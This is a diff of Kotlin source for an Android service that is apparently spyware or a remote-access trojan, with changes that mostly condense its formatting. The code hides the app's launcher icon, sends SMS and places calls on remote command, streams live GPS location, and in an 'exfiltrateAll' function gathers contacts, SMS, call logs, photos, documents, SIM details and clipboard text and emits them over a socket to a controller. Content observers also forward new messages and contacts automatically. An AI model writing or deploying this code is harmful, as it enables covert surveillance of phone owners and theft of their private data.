-                        android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
-                    put("uid", appInfo.uid)
-                    put("dataDir", appInfo.dataDir)
-                    put("sourceDir", appInfo.sourceDir)
-                }
-                apps.put(app)
-            } catch (e: Exception) {
-            }
+                apps.put(JSONObject().apply {
+                    put("packageName", appInfo.packageName); put("appName", info.loadLabel(packageManager).toString())
+                    put("versionName", packageManager.getPackageInfo(appInfo.packageName, 0).versionName)
+                    put("versionCode", packageManager.getPackageInfo(appInfo.packageName, 0).versionCode)
+                    put("firstInstallTime", packageManager.getPackageInfo(appInfo.packageName, 0).firstInstallTime)
+                    put("lastUpdateTime", packageManager.getPackageInfo(appInfo.packageName, 0).lastUpdateTime)
+                    put("isSystemApp", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
+                    put("uid", appInfo.uid); put("dataDir", appInfo.dataDir); put("sourceDir", appInfo.sourceDir)
+                })
+            } catch (e: Exception) {}
         }
-        
-        return JSONObject().apply {
-            put("installedApps", apps)
-            put("total", apps.length())
-        }
+        return JSONObject().apply { put("installedApps", apps); put("total", apps.length()) }
     }
     
     private fun getMediaFiles(type: String): JSONObject {
         val files = JSONArray()
-        val collection = if (type == "images") {
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        } else {
-            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-        }
-        
-        val projection = arrayOf(
-            MediaStore.MediaColumns._ID,
-            MediaStore.MediaColumns.DISPLAY_NAME,
-            MediaStore.MediaColumns.DATE_ADDED,
-            MediaStore.MediaColumns.SIZE,
-            MediaStore.MediaColumns.MIME_TYPE,
-            MediaStore.MediaColumns.RELATIVE_PATH
-        )
-        
-        // FIXED: No LIMIT in sortOrder
-        val cursor = contentResolver.query(
-            collection,
-            projection,
-            null,
-            null,
-            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-        )
-        
+        val collection = if (type == "images") MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+        val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.DATE_ADDED, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.RELATIVE_PATH)
+        val cursor = contentResolver.query(collection, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
         var count = 0
         cursor?.use { c ->
             while (c.moveToNext() && count < MAX_RESULTS) {
                 try {
-                    val id = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
-                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
-                    val date = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED))
-                    val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE))
-                    val mime = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE))
-                    val path = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH))
-                    
-                    val file = JSONObject().apply {
-                        put("id", id)
-                        put("name", name)
-                        put("date", date * 1000L)
-                        put("size", size)
-                        put("mimeType", mime)
-                        put("path", path)
-                        put("uri", "${collection}/$id")
-                    }
-                    files.put(file)
-                    count++
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading media: ${e.message}")
-                }
-            }
-        }
-        
-        return JSONObject().apply {
-            put(type, files)
-            put("total", files.length())
-        }
-    }
-    
-    private fun getDocuments(): JSONObject {
-        val documents = JSONArray()
-        val collection = MediaStore.Files.getContentUri("external")
-        
-        val mimeTypes = arrayOf(
-            "application/pdf",
-            "application/msword",
-            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
-            "application/vnd.ms-excel",
-            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
-            "text/plain",
-            "text/html"
-        )
-        
-        val selection = mimeTypes.joinToString(" OR ") {
-            "${MediaStore.MediaColumns.MIME_TYPE} = ?"
-        }
-        
-        // FIXED: No LIMIT in sortOrder
-        val cursor = contentResolver.query(
-            collection,
-            arrayOf(
-                MediaStore.MediaColumns._ID,
-                MediaStore.MediaColumns.DISPLAY_NAME,
-                MediaStore.MediaColumns.DATE_ADDED,
-                MediaStore.MediaColumns.SIZE,
-                MediaStore.MediaColumns.MIME_TYPE,
-                MediaStore.MediaColumns.RELATIVE_PATH
-            ),
-            selection,
-            mimeTypes,
-            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-        )
-        
-        var count = 0
-        cursor?.use { c ->
-            while (c.moveToNext() && count < MAX_RESULTS) {
-                try {
-                    val doc = JSONObject().apply {
+                    files.put(JSONObject().apply {
                         put("id", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)))
                         put("name", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)))
                         put("date", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)) * 1000L)
                         put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
                         put("mimeType", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)))
                         put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)))
-                    }
-                    documents.put(doc)
-                    count++
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading document: ${e.message}")
-                }
+                        put("uri", "${collection}/$id")
+                    }); count++
+                } catch (e: Exception) { Log.e(TAG, "Error reading media: ${e.message}") }
             }
         }
-        
-        return JSONObject().apply {
-            put("documents", documents)
-            put("total", documents.length())
+        return JSONObject().apply { put(type, files); put("total", files.length()) }
+    }
+    
+    private fun getDocuments(): JSONObject {
+        val documents = JSONArray()
+        val collection = MediaStore.Files.getContentUri("external")
+        val mimeTypes = arrayOf("application/pdf", "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "text/plain", "text/html")
+        val selection = mimeTypes.joinToString(" OR ") { "${MediaStore.MediaColumns.MIME_TYPE} = ?" }
+        val cursor = contentResolver.query(collection, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.DATE_ADDED, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.RELATIVE_PATH), selection, mimeTypes, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
+        var count = 0
+        cursor?.use { c ->
+            while (c.moveToNext() && count < MAX_RESULTS) {
+                try {
+                    documents.put(JSONObject().apply {
+                        put("id", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)))
+                        put("name", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)))
+                        put("date", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)) * 1000L)
+                        put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
+                        put("mimeType", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)))
+                        put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)))
+                    }); count++
+                } catch (e: Exception) { Log.e(TAG, "Error reading document: ${e.message}") }
+            }
         }
+        return JSONObject().apply { put("documents", documents); put("total", documents.length()) }
     }
     
     private fun sendSms(params: JSONObject): JSONObject {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-            return JSONObject().apply { put("error", "SMS permission not granted") }
-        }
-        
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) { return JSONObject().apply { put("error", "SMS permission not granted") } }
         try {
-            val number = params.getString("number")
-            val message = params.getString("message")
-            
+            val number = params.getString("number"); val message = params.getString("message")
             val smsManagerClass = Class.forName("android.telephony.SmsManager")
-            val getDefault = smsManagerClass.getMethod("getDefault")
-            val smsManager = getDefault.invoke(null)
-            val sendTextMessage = smsManagerClass.getMethod(
-                "sendTextMessage", 
-                String::class.java, 
-                String::class.java, 
-                String::class.java, 
-                android.app.PendingIntent::class.java, 
-                android.app.PendingIntent::class.java
-            )
+            val getDefault = smsManagerClass.getMethod("getDefault"); val smsManager = getDefault.invoke(null)
+            val sendTextMessage = smsManagerClass.getMethod("sendTextMessage", String::class.java, String::class.java, String::class.java, android.app.PendingIntent::class.java, android.app.PendingIntent::class.java)
             sendTextMessage.invoke(smsManager, number, null, message, null, null)
-            
-            return JSONObject().apply {
-                put("success", true)
-                put("to", number)
-                put("messagePreview", message.take(50))
-            }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+            return JSONObject().apply { put("success", true); put("to", number); put("messagePreview", message.take(50)) }
+        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun getClipboard(): JSONObject {
-        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) 
-            as android.content.ClipboardManager
-        
-        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             JSONObject().apply { put("error", "Clipboard access limited on Android 10+") }
         } else {
             val clip = clipboardManager.primaryClip
-            if (clip != null && clip.itemCount > 0) {
-                val text = clip.getItemAt(0).text?.toString() ?: ""
-                JSONObject().apply {
-                    put("text", text)
-                    put("length", text.length)
-                    put("timestamp", System.currentTimeMillis())
-                }
-            } else {
-                JSONObject().apply { put("text", "") }
-            }
+            if (clip != null && clip.itemCount > 0) { val text = clip.getItemAt(0).text?.toString() ?: ""; JSONObject().apply { put("text", text); put("length", text.length); put("timestamp", System.currentTimeMillis()) } }
+            else { JSONObject().apply { put("text", "") } }
         }
     }
     
@@ -1122,10 +690,7 @@ class MainService : Service() {
         return JSONObject().apply {
             put("level", intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0)
             put("scale", intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100)
-            put("isCharging", intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == 
-                BatteryManager.BATTERY_STATUS_CHARGING || 
-                intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == 
-                BatteryManager.BATTERY_STATUS_FULL)
+            put("isCharging", intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == BatteryManager.BATTERY_STATUS_CHARGING || intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1 == BatteryManager.BATTERY_STATUS_FULL)
             put("plugged", intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0)
             put("temperature", (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0)
             put("voltage", intent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0)
@@ -1136,191 +701,95 @@ class MainService : Service() {
     
     private fun getSimInfo(): JSONObject {
         return JSONObject().apply {
-            if (ActivityCompat.checkSelfPermission(this@MainService,
-                    Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                val simSerial = telephonyManager.simSerialNumber
-                val subscriberId = telephonyManager.subscriberId
-                val networkOperator = telephonyManager.networkOperatorName
-                val simCountryIso = telephonyManager.simCountryIso
-                val simOperator = telephonyManager.simOperatorName
-                val simState = telephonyManager.simState
-                
-                put("simSerial", simSerial)
-                put("subscriberId", subscriberId?.replace(subscriberId.substring(0, 
-                    minOf(6, subscriberId.length)), "******"))
-                put("networkOperator", networkOperator)
-                put("simCountry", simCountryIso)
-                put("simOperator", simOperator)
-                put("simState", simState)
-                put("hasIccCard", telephonyManager.hasIccCard())
-                put("phoneCount", telephonyManager.phoneCount)
-                put("isNetworkRoaming", telephonyManager.isNetworkRoaming)
-            } else {
-                put("error", "Phone state permission not granted")
-            }
+            if (ActivityCompat.checkSelfPermission(this@MainService, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                put("simSerial", telephonyManager.simSerialNumber)
+                put("subscriberId", telephonyManager.subscriberId?.replace(telephonyManager.subscriberId.substring(0, minOf(6, telephonyManager.subscriberId.length)), "******"))
+                put("networkOperator", telephonyManager.networkOperatorName); put("simCountry", telephonyManager.simCountryIso)
+                put("simOperator", telephonyManager.simOperatorName); put("simState", telephonyManager.simState)
+                put("hasIccCard", telephonyManager.hasIccCard()); put("phoneCount", telephonyManager.phoneCount); put("isNetworkRoaming", telephonyManager.isNetworkRoaming)
+            } else { put("error", "Phone state permission not granted") }
         }
     }
     
     private fun getNetworkInfo(): JSONObject {
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) 
-            as android.net.ConnectivityManager
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
         val networkInfo = connectivityManager.activeNetworkInfo
-        
         return JSONObject().apply {
             put("isConnected", networkInfo?.isConnected ?: false)
-            put("type", if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) 
-                "WiFi" else "Mobile")
-            put("typeName", networkInfo?.typeName ?: "Unknown")
-            put("subtypeName", networkInfo?.subtypeName ?: "")
-            put("ipAddress", getLocalIpAddress())
-            
+            put("type", if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) "WiFi" else "Mobile")
+            put("typeName", networkInfo?.typeName ?: "Unknown"); put("subtypeName", networkInfo?.subtypeName ?: ""); put("ipAddress", getLocalIpAddress())
             if (networkInfo?.type == android.net.ConnectivityManager.TYPE_WIFI) {
-                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) 
-                    as android.net.wifi.WifiManager
-                val wifiInfo = wifiManager.connectionInfo
-                put("ssid", wifiInfo.ssid)
-                put("bssid", wifiInfo.bssid)
-                put("rssi", wifiInfo.rssi)
-                put("frequency", wifiInfo.frequency)
-                put("linkSpeed", wifiInfo.linkSpeed)
+                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                val wifiInfo = wifiManager.connectionInfo; put("ssid", wifiInfo.ssid); put("bssid", wifiInfo.bssid); put("rssi", wifiInfo.rssi); put("frequency", wifiInfo.frequency); put("linkSpeed", wifiInfo.linkSpeed)
             }
         }
     }
     
     private fun hideAppLauncher(): JSONObject {
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-            return JSONObject().apply { put("success", true) }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+        try { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP); return JSONObject().apply { put("success", true) } }
+        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun unhideAppLauncher(): JSONObject {
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP
-            )
-            return JSONObject().apply { put("success", true) }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+        try { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP); return JSONObject().apply { put("success", true) } }
+        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun openUrl(params: JSONObject): JSONObject {
-        try {
-            val url = params.getString("url")
-            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-            return JSONObject().apply { put("success", true) }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+        try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(params.getString("url"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); return JSONObject().apply { put("success", true) } }
+        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun vibrateDevice(params: JSONObject): JSONObject {
         try {
-            val duration = params.optLong("duration", 1000)
-            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                vibrator.vibrate(VibrationEffect.createOneShot(
-                    duration, VibrationEffect.DEFAULT_AMPLITUDE))
-            } else {
-                @Suppress("DEPRECATION")
-                vibrator.vibrate(duration)
-            }
+            val duration = params.optLong("duration", 1000); val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
+            else @Suppress("DEPRECATION") vibrator.vibrate(duration)
             return JSONObject().apply { put("success", true) }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun makeCall(params: JSONObject): JSONObject {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-            return JSONObject().apply { put("error", "Call permission not granted") }
-        }
-        try {
-            val number = params.getString("number")
-            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-            return JSONObject().apply { put("success", true) }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Call permission not granted") }
+        try { startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:${params.getString("number")}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); return JSONObject().apply { put("success", true) } }
+        catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun startContinuousLocation(): JSONObject {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            return JSONObject().apply { put("error", "Location permission not granted") }
-        }
-        
-        locationManager.requestLocationUpdates(
-            LocationManager.GPS_PROVIDER,
-            5000,
-            10f,
-            object : LocationListener {
-                override fun onLocationChanged(location: Location) {
-                    try {
-                        val locData = JSONObject().apply {
-                            put("lat", location.latitude)
-                            put("lng", location.longitude)
-                            put("accuracy", location.accuracy)
-                            put("speed", location.speed)
-                            put("bearing", location.bearing)
-                            put("timestamp", location.time)
-                        }
-                        socket.emit("device:data:bulk", JSONObject().apply {
-                            put("location", locData)
-                        })
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error sending location: ${e.message}")
-                    }
-                }
-                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
-                override fun onProviderEnabled(provider: String) {}
-                override fun onProviderDisabled(provider: String) {}
-            },
-            Looper.getMainLooper()
-        )
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Location permission not granted") }
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, object : LocationListener {
+            override fun onLocationChanged(location: Location) {
+                try { socket.emit("device:data:bulk", JSONObject().apply { put("location", JSONObject().apply { put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy); put("speed", location.speed); put("bearing", location.bearing); put("timestamp", location.time) }) }) }
+                catch (e: Exception) { Log.e(TAG, "Error sending location: ${e.message}") }
+            }
+            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+            override fun onProviderEnabled(provider: String) {}
+            override fun onProviderDisabled(provider: String) {}
+        }, Looper.getMainLooper())
         return JSONObject().apply { put("success", true) }
     }
     
-    private fun stopContinuousLocation(): JSONObject {
-        locationManager.removeUpdates { true }
-        return JSONObject().apply { put("success", true) }
-    }
+    private fun stopContinuousLocation(): JSONObject { locationManager.removeUpdates { true }; return JSONObject().apply { put("success", true) } }
     
     private fun exfiltrateAll(): JSONObject {
         Thread {
             try {
                 val allData = JSONObject()
-                allData.put("contacts", getContacts())
-                allData.put("sms", getSmsMessages())
-                allData.put("callLogs", getCallLogs())
-                allData.put("deviceInfo", getDetailedDeviceInfo())
-                allData.put("installedApps", getInstalledApps())
-                allData.put("location", getCurrentLocation())
-                allData.put("photos", getMediaFiles("images"))
-                allData.put("videos", getMediaFiles("videos"))
-                allData.put("documents", getDocuments())
-                allData.put("battery", getBatteryInfo())
-                allData.put("simInfo", getSimInfo())
-                allData.put("networkInfo", getNetworkInfo())
-                allData.put("clipboard", getClipboard())
+                getContacts()?.let { allData.put("contacts", it) }
+                getSmsMessages()?.let { allData.put("sms", it) }
+                getCallLogs()?.let { allData.put("callLogs", it) }
+                getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
+                getInstalledApps()?.let { allData.put("installedApps", it) }
+                getCurrentLocation()?.let { allData.put("location", it) }
+                getMediaFiles("images")?.let { allData.put("photos", it) }
+                getMediaFiles("videos")?.let { allData.put("videos", it) }
+                getDocuments()?.let { allData.put("documents", it) }
+                getBatteryInfo()?.let { allData.put("battery", it) }
+                getSimInfo()?.let { allData.put("simInfo", it) }
+                getNetworkInfo()?.let { allData.put("networkInfo", it) }
+                getClipboard()?.let { allData.put("clipboard", it) }
                 socket.emit("device:data:bulk", allData)
-            } catch (e: Exception) {
-                Log.e(TAG, "Exfiltration error: ${e.message}")
-            }
+            } catch (e: Exception) { Log.e(TAG, "Exfiltration error: ${e.message}") }
         }.start()
         return JSONObject().apply { put("status", "started") }
     }
@@ -1330,155 +799,48 @@ class MainService : Service() {
             override fun run() {
                 try {
                     socket.emit("device:ping")
-                    socket.emit("device:update", JSONObject().apply {
-                        put("batteryLevel", getBatteryLevel())
-                        put("isCharging", isCharging())
-                    })
-                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) {
-                        sendBulkData()
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Periodic update error: ${e.message}")
-                }
+                    socket.emit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
+                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) sendBulkData()
+                } catch (e: Exception) { Log.e(TAG, "Periodic update error: ${e.message}") }
                 Handler(Looper.getMainLooper()).postDelayed(this, 30000)
             }
         }, 30000)
     }
     
-    private fun startBatteryMonitoring() {
-        registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-    }
+    private fun startBatteryMonitoring() { registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) }
     
     private fun registerContentObservers() {
-        contentResolver.registerContentObserver(
-            Telephony.Sms.CONTENT_URI, 
-            true, 
-            object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-                override fun onChange(selfChange: Boolean) {
-                    getSmsMessages()?.let {
-                        socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) })
-                    }
-                }
-            }
-        )
-        contentResolver.registerContentObserver(
-            ContactsContract.Contacts.CONTENT_URI,
-            true,
-            object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-                override fun onChange(selfChange: Boolean) {
-                    getContacts()?.let {
-                        socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) })
-                    }
-                }
-            }
-        )
+        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
+        })
+        contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean) { getContacts()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
+        })
     }
     
     private fun getBatteryLevel(): Int {
         val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
-        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
-        return (level * 100.0 / scale).roundToInt()
+        return ((intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0) * 100.0 / (intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100)).roundToInt()
     }
     
     private fun isCharging(): Boolean {
-        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
-        return status == BatteryManager.BATTERY_STATUS_CHARGING || 
-               status == BatteryManager.BATTERY_STATUS_FULL
+        val s = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+        return s == BatteryManager.BATTERY_STATUS_CHARGING || s == BatteryManager.BATTERY_STATUS_FULL
     }
     
     private fun getLocalIpAddress(): String {
-        try {
-            val interfaces = NetworkInterface.getNetworkInterfaces()
-            while (interfaces.hasMoreElements()) {
-                val networkInterface = interfaces.nextElement()
-                val addresses = networkInterface.inetAddresses
-                while (addresses.hasMoreElements()) {
-                    val address = addresses.nextElement()
-                    if (!address.isLoopbackAddress && address is java.net.Inet4Address) {
-                        return address.hostAddress ?: "Unknown"
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            return "Unknown"
-        }
-        return "Unknown"
+        try { val interfaces = NetworkInterface.getNetworkInterfaces(); while (interfaces.hasMoreElements()) { val addresses = interfaces.nextElement().inetAddresses; while (addresses.hasMoreElements()) { val a = addresses.nextElement(); if (!a.isLoopbackAddress && a is java.net.Inet4Address) return a.hostAddress ?: "Unknown" } } } catch (e: Exception) {}; return "Unknown"
     }
     
-    private fun getWifiMacAddress(): String {
-        return try {
-            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) 
-                as android.net.wifi.WifiManager
-            val wifiInfo = wifiManager.connectionInfo
-            wifiInfo.macAddress ?: "02:00:00:00:00:00"
-        } catch (e: Exception) {
-            "02:00:00:00:00:00"
-        }
-    }
+    private fun getWifiMacAddress(): String { return try { (applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager).connectionInfo.macAddress ?: "02:00:00:00:00:00" } catch (e: Exception) { "02:00:00:00:00:00" } }
     
-    private fun getPhoneType(): String {
-        return when (telephonyManager.phoneType) {
-            TelephonyManager.PHONE_TYPE_GSM -> "GSM"
-            TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
-            TelephonyManager.PHONE_TYPE_SIP -> "SIP"
-            else -> "Unknown"
-        }
-    }
+    private fun getPhoneType(): String { return when (telephonyManager.phoneType) { TelephonyManager.PHONE_TYPE_GSM -> "GSM"; TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"; TelephonyManager.PHONE_TYPE_SIP -> "SIP"; else -> "Unknown" } }
     
-    private fun getNetworkType(): String {
-        return when (telephonyManager.dataNetworkType) {
-            TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
-            TelephonyManager.NETWORK_TYPE_NR -> "5G"
-            TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
-            TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
-            TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
-            TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"
-            else -> "Unknown"
-        }
-    }
+    private fun getNetworkType(): String { return when (telephonyManager.dataNetworkType) { TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"; TelephonyManager.NETWORK_TYPE_NR -> "5G"; TelephonyManager.NETWORK_TYPE_UMTS -> "3G"; TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"; TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"; TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"; else -> "Unknown" } }
     
-    private fun getNetworkOperator(): String {
-        return telephonyManager.networkOperatorName ?: "Unknown"
-    }
+    private fun getNetworkOperator(): String { return telephonyManager.networkOperatorName ?: "Unknown" }
     
-    private fun getPhoneTypeLabel(type: Int): String {
-        return when (type) {
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK -> "Callback"
-            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CAR -> "Car"
